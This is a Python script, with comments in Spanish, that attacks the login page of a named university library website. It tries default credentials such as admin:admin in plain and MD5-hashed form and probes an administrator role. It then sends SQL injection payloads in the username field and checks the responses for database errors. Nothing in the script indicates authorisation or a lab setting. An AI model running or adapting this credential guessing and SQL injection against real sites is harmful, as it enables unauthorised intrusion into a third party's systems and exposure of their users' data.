import requests, urllib3, re, hashlib
urllib3.disable_warnings()

BASE = "https://biblioteca.uns.edu.pe"
h = {'User-Agent': 'Mozilla/5.0', 'Referer': BASE + '/inicia_sesion.asp'}

print("="*60)
print("ANALISIS PROFUNDO DE LOGIN: login.asp")
print("="*60)

# 1. Ver que hace login.asp cuando falla (respuesta sin credenciales)
r_naked = requests.get(BASE + '/login.asp', headers=h, verify=False, timeout=8)
print(f"\n[A] GET login.asp directo: status={r_naked.status_code}, url={r_naked.url}, len={len(r_naked.content)}")

# 2. POST con password como texto plano (no md5) para ver si acepta
for usr, raw_pass in [('admin', 'admin'), ('biblioteca', '12345')]:
    # Sin MD5
    data_plain = {'t_usuario': usr, 't_clave': raw_pass, 'modo': 'U', 'B1': 'Iniciar Sesion'}
    r_plain = requests.post(BASE + '/login.asp', data=data_plain, headers=h, verify=False, timeout=8, allow_redirects=False)
    print(f"\n[B_PLAIN] {usr}:{raw_pass} -> status={r_plain.status_code}, Location={r_plain.headers.get('Location','')}")
    
    # Con MD5
    md5pass = hashlib.md5(raw_pass.encode()).hexdigest()
    data_md5 = {'t_usuario': usr, 't_clave': md5pass, 'modo': 'U', 'B1': 'Iniciar Sesion'}
    r_md5 = requests.post(BASE + '/login.asp', data=data_md5, headers=h, verify=False, timeout=8, allow_redirects=False)
    print(f"[B_MD5]   {usr}:{md5pass[:8]}... -> status={r_md5.status_code}, Location={r_md5.headers.get('Location','')}")

# 3. Probar modo Administrador
data_admin = {'t_usuario': 'admin', 't_clave': hashlib.md5(b'admin').hexdigest(), 'modo': 'A', 'B1': 'Iniciar Sesion'}
r_admin = requests.post(BASE + '/login.asp', data=data_admin, headers=h, verify=False, timeout=8, allow_redirects=False)
print(f"\n[C] modo=A (admin role): status={r_admin.status_code}, Location={r_admin.headers.get('Location','')}")

# 4. SQLi en campo usuario - no MD5 en contraseña
sqli_payloads = [
    ("' OR '1'='1", "any"),
    ("' OR 1=1--", "any"),
    ("admin'--", "any"),
    ("' UNION SELECT NULL--", "any"),
]
print("\n[D] SQLi en campo t_usuario:")
for usr_payload, pwd in sqli_payloads:
    data_sqli = {'t_usuario': usr_payload, 't_clave': 'test', 'modo': 'U', 'B1': 'Iniciar Sesion'}
    r_sqli = requests.post(BASE + '/login.asp', data=data_sqli, headers=h, verify=False, timeout=8, allow_redirects=False)
    loc = r_sqli.headers.get('Location', '')
    # Check for DB errors in response 
    clean = r_sqli.text.lower()
    has_err = any(kw in clean for kw in ['error', 'syntax', 'odbc', 'jet', 'oledb', 'access', 'microsoft'])
    print(f"  {usr_payload!r} -> status={r_sqli.status_code}, loc={loc!r}, db_error={has_err}")
